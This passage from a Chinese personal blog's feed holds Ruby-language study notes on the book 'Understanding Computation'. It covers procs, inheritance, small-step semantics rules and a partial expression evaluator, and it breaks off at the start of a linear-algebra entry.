&lt;span class=&quot;n&quot;&gt;multiply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# proc的调用, 可以用call, 可以用方括号&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;multiply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# =&amp;gt; 54&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;multiply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# =&amp;gt; 6&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;multiply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# =&amp;gt; 12&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;类和模块&quot;&gt;类和模块&lt;/h3&gt;
&lt;p&gt;类就是一个分类的思想, 然后模块的思想就是多重继承?&lt;/p&gt;

&lt;p&gt;在子类里面可以用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super&lt;/code&gt;来调用超类里面的同名方法.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Father&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Children&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Father&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Children&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;superclass&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# =&amp;gt; Father&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Children&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;child&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# =&amp;gt; -6&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在子类里面可以拥有父类的方法, 并且, 通常的做到这样的方法是利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;module&lt;/code&gt;来做, 
因为这样可以mix-in多个所谓的父类.&lt;/p&gt;

&lt;h3 id=&quot;杂项&quot;&gt;杂项&lt;/h3&gt;
&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# inspect方法, 提供一个对象在控制台中展示的方式&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# =&amp;gt; #&amp;lt;Object:0x0000aaab0df110b8&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;inspect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;OOOOOOO&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# =&amp;gt; OOOOOOO&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 定义方法的时候用`*'运算符来表示数目可变的参数, &lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# 虽然每个方法只能有一个可变参数, 但是可变参数的位置可以随便放&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 删除常量&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:remove_const&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:CONST_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# 注: remove_const是一个private方法, 只能内部调用&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;程序和机器&quot;&gt;程序和机器&lt;/h2&gt;
&lt;p&gt;“含义”的含义, 这个问题倒是没有仔细想过. 我们周围的东西都是一些符号, 
譬如虚数$i$, 就不过是满足方程$x^2 + 1 = 0$的符号而已
(实际并不是, 因为不是这样定义的, 上面说是拥有这样性质的符号的话, 感觉更好, 
不过, 直接的那样的定义感觉很好理解), 这样的符号的指意能力, 就是一种哲学的思想. 
(我现在可以理解一点”语义分析”的意思了, 大概)&lt;/p&gt;

&lt;p&gt;考虑”形式主义”, 在”我是谁? “, 这个问句里面, 有主语, 谓语, 还有宾语, 
这样的组合形成了一个句子. 然后可以适当地替换其中的成分, 就可以得到新的含义, 
然而实际上这不过是符号之间的不同组合罢了. 但是, 假如调换了顺序, 
或者改变了结构, 哪怕是同样的符号也不能够有原来的含义.&lt;/p&gt;

&lt;p&gt;啊这, 感觉自己在讲废话.&lt;/p&gt;

&lt;p&gt;回到计算机程序, 计算机程序的语言实际上就像是人的语言一样, 或者干脆说, 
就是人的语言也不是不行. 计算机的编程语言也有自己的结构, 然后对于这样的结构, 
计算机做的事情就是将语句破碎分割成片段, 然后重新根据片段构建一个结构的概念, 
接着再在结构的基础上形成语义的概念. (代码通过语法解析器生成抽象语法树AST, 
即Abstract Syntax Tree; 在这基础上继续执行得到程序的意义)&lt;/p&gt;

&lt;p&gt;那么人是如何处理语言和语义的? 听到一句话, 然后我会下意识地去分析语法结构吗? 
但是语法结构明明是我在会说会写之后才掌握的吧? 啊, 不是, 
我觉得应该确实有这样的下意识过程. 拿学习语言的过程来看, 一开始什么也不会, 
也就有需要单纯的结构来得到语义的过程. 比如”私わ中国人です”, 
就像是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;String&lt;/code&gt;的模版一样, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;#{a}わ#{b}です&quot;&lt;/code&gt;, 就好像是在说&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a=b&lt;/code&gt;一样. 
感觉我学的时候就是有这样的一个转换过程, 然后熟练了之后就变成了无意识的过程了.&lt;/p&gt;

&lt;p&gt;然后为了得到确定的语义, 也就是为了消除二义性, 就要有对语言的规范的定义. 
比如”我家热得快炸了”就有二义性, 首先可以这样断句(语义断句): 
“我/家//热得//快炸了”, 就是一个”主语(定语/主语)//谓语//状语”的概念. 
然后又可以这样断句: “我家/热得快//炸了”, 就是一个”主语(定语/主语)//状语”. 
(注: 热得快以一种加热器, 热水用的. )
(这段语文的分析完全是随意分析的, 有错是应该很正常的. )&lt;/p&gt;

&lt;h3 id=&quot;小步语义和大步语义&quot;&gt;小步语义和大步语义&lt;/h3&gt;
&lt;p&gt;书中利用了一个Simple语言的例子来讲, 我就照猫画虎地试试看看能不能也来一个.&lt;/p&gt;

&lt;p&gt;首先是&lt;strong&gt;小步语义&lt;/strong&gt;, 数学定义如下:&lt;/p&gt;

\[\frac{\langle e_1, \sigma \rangle \leadsto_e e_1'}{\langle e_1 + e_2, \sigma \rangle \leadsto_e e_1' + e_2} \quad \frac{\langle e_2, \sigma \rangle \leadsto_e e_2'}{\langle v_1 + e_2, \sigma \rangle \leadsto_e v_1 + e_2'} \\ \frac{}{\langle n_1 + n_2, \sigma \rangle \leadsto_e n} \  \mathrm{if} \  n = n_1 + n_2 \\ \frac{\langle e_1, \sigma \rangle \leadsto_e e_1'}{\langle e_1 * e_2, \sigma \langle \leadsto_e e_1' * e_2} \quad \frac{\langle e_2, \sigma \rangle \leadsto_e e_2'}{\langle v_1 * e_2, \sigma \rangle \leadsto_e v_1 * e_2'} \\ \frac{}{\langle n_1 * n_2, \sigma \rangle \leadsto_e n} \  \mathrm{if} \  n = n_1 \times n_2 \\ \frac{\langle e_1, \sigma \rangle \leadsto_e e_1'}{\langle e_1 &amp;lt; e_2, \sigma \rangle \leadsto_e e_1' &amp;lt; e_2} \quad \frac{\langle e_2, \sigma \rangle \leadsto_e e_2'}{\langle v_1 &amp;lt; e_2, \sigma \rangle \leadsto_e v_1 &amp;lt; e_2'} \\ \frac{}{\langle n_1 &amp;lt; n_2, \sigma \rangle \leadsto_e \boldsymbol{\mathrm{true}}} \  \mathrm{if} \  n_1 &amp;lt; n_2 \quad \frac{}{\langle n_1 &amp;lt; n_2, \sigma \leadsto_e \boldsymbol{\mathrm{false}}} \  \mathrm{if} \  n_1 \geq n_2 \\ \frac{}{\langle x, \sigma \rangle \leadsto_e \sigma(x)} \  \mathrm{if} x \in \mathrm{dom}(\sigma) \\ \frac{\langle e, \sigma \rangle \leadsto_e e'}{\langle x = e, \sigma \rangle \leadsto_s \langle x = e', \sigma \rangle} \quad \frac{}{\langle x = v, \sigma \rangle \leadsto_s \langle \boldsymbol{\mathrm{do-nothing}}, \sigma [x \mapsto v]} \\ \frac{\langle e, \sigma \rangle \leadsto_e e'}{\langle \boldsymbol{\mathrm{if}} (e) \{ s_1 \} \boldsymbol{\mathrm{else}} \{ s_2 \}, \sigma \rangle \leadsto_s \langle s_1, \sigma \rangle} \\ \frac{}{\langle \boldsymbol{\mathrm{if}} (\boldsymbol{\mathrm{true}}) \{ s_1 \} \boldsymbol{\mathrm{else}} \{ s_2 \}, \sigma \rangle, \leadsto_s \langle s_1, \sigma \rangle} \quad \frac{}{\langle \boldsymbol{\mathrm{if}} (\boldsymbol{\mathrm{false}}) \{ s_1 \} \boldsymbol{\mathrm{else}} \{ s_2 \}, \sigma \rangle \leadsto_s \langle s_2, \sigma \rangle} \\ \frac{\langle s_1, \sigma \rangle \leadsto_s \langle s_1', \sigma' \rangle}{\langle s_1; s_2, \sigma \rangle \leadsto_s \langle s_1'; s_2, \sigma' \rangle} \quad \frac{}{\langle \boldsymbol{\mathrm{do-nothing}}; s_2, \sigma \rangle \leadsto_s \langle s_2, \sigma \rangle} \\ \frac{}{\langle \boldsymbol{\mathrm{while}} (e) \{ s \}, \sigma \rangle \leadsto_s \langle \boldsymbol{\mathrm{if}} (e) \{ s; \boldsymbol{\mathrm{while}} (e) \{ s \} \} \boldsymbol{\mathrm{else}} \boldsymbol{\mathrm{else}} \{ \boldsymbol{\mathrm{do-nothing}} \}, \sigma \rangle}\]

&lt;p&gt;虽然看起来就是和一堆乱码没有任何的区别, 但是这就是利用一个迭代的定义方式, 
来得到了对于Simple的定义. 我觉得这样的定义十分的漂亮和简洁, 
所以我就用这个方法来介绍.&lt;/p&gt;

&lt;p&gt;首先是要理解这里面的每个元素和语义的含义, 然后请尝试理解一下:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;首先是&lt;strong&gt;表达式&lt;/strong&gt;
$\langle \mathrm{expression}, \mathrm{environment} \rangle$   &lt;br /&gt;
这个实际上就是我们的$e, e_1, e_2$等等的东西.&lt;/li&gt;
  &lt;li&gt;表达式会对应着&lt;strong&gt;值&lt;/strong&gt;, $e’$这样的东西, 或者也可以叫做是&lt;strong&gt;返回值&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;相对于$e’$的返回值(这样的值更像是符号值), 定义一个&lt;strong&gt;字面值&lt;/strong&gt;, 即$n$&lt;/li&gt;
  &lt;li&gt;并且有两个特殊的值, &lt;strong&gt;true&lt;/strong&gt;和&lt;strong&gt;false&lt;/strong&gt;, 是一个(特殊含义的符号值)&lt;/li&gt;
  &lt;li&gt;然后是&lt;strong&gt;环境&lt;/strong&gt;$\sigma$ (或者叫做&lt;strong&gt;上下文&lt;/strong&gt;会不会更好? )&lt;/li&gt;
  &lt;li&gt;在环境中有&lt;strong&gt;变量&lt;/strong&gt;$x$, 也是一种符号值(应该不是符号值, 
算是一种根据符号然后去找出值的映射)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(感觉自己缺乏很好的语言来描述)&lt;/p&gt;

&lt;p&gt;那可以来几个例子:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;$(1 * 2) + (3 * 4)$    &lt;br /&gt;
这个表达式在上面的规则里面可以写成:  &lt;br /&gt;
\(\langle (1 * 2) + (3 * 4), \sigma \rangle \\ \leadsto_e \langle (1 * 2), \sigma \rangle + \langle (3 * 4), \sigma \rangle \\ \leadsto (1 * 2) + (3 * 4) = 2 + 12 = 14\)    &lt;br /&gt;
不要觉得这个简直就是脱裤子放屁, 因为我们可以利用这样的方法来得到复杂的结论, 
比如说让计算机来运算更加复杂的表达式.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Note: 我打算和原来的做法不一样, &lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#   试试看自己写新的代码, 不是照抄原来的代码. &lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 首先是一个能够执行代码的机器, &lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#   它的输入是一个表达式, 我们的机器的功能就是可以对这个表达式进行求值&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#   然后还有一个环境, 在这个环境里面有我们的变量&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Machine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:exp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# run方法的作用就是让机器来运行表达式&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@exp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;eval&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# &lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Expression&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 拥有一个可变的参数列表输入&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@arg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# 这里的eval方法就是一个空方法, 可以说就是do-nothing&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;#   具体的运算的方法要在每个子类里面定义&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Add&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Expression&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 加法就是把所有的参数(字面值)加在一起&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;eval&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;is_a?&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Expression&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;eval&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Mutiply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Expression&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 乘法就是把所有的参数(字面值)乘在一起&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;eval&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;is_a?&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Expression&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;eval&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 定义一个小于的比较&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Compare&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Expression&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 于是&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#   Add.new(Mutiply.new(1, 2), Mutiply.new(3, 4)).eval&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#     # =&amp;gt; 14&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(2022-1-13: 这几天先学CTF, 有些头大. 这个先停一下. )&lt;/p&gt;</content><author><name></name></author><category term="ruby" /><summary type="html">计算的本质 – 读书记录 因为SICP太难了, 所以从这本简单一点的书开始看看, 顺带对应明年的计科导第一单元. 算是预习吧? 是吧?</summary></entry><entry><title type="html">Linear Algebra First Semester The End</title><link href="http://0.0.0.0:4000/notes/linear-algebra-final/" rel="alternate" type="text/html" title="Linear Algebra First Semester The End" /><published>2022-01-05T14:51:07+00:00</published><updated>2022-01-05T14:51:07+00:00</updated><id>http://0.0.0.0:4000/notes/linear-algebra-final</id><content type="html" xml:base="http://0.0.0.0:4000/notes/linear-algebra-final/">&lt;h1 id=&quot;线性代数&quot;&gt;&lt;del&gt;线性代数&lt;/del&gt;&lt;/h1&gt;
